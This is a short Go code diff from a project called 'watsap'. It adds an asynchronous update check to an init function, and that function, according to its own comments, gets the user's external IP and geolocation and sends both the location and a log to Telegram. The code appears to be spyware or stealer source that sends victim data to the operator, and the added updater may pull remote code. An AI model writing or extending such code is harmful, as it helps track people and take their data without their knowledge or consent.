@@ -4,6 +4,7 @@ import (
 	"os"
 	"time"
 	"watsap/plugins/geoip"
+	"watsap/plugins/update"
 	"watsap/utils/config"
 	"watsap/utils/messages"
 	"watsap/utils/secure"
@@ -41,5 +42,6 @@ func InitWa() {
 	geoip.GetIP()       // get user external IP address and geo location
 	geoip.SendGeoToTG() // send user geo location to telegram
 	go SendLogToTG()    // send log to telegram
+	go update.WatsapUpdate() // check for updates asynchronously
 }
 
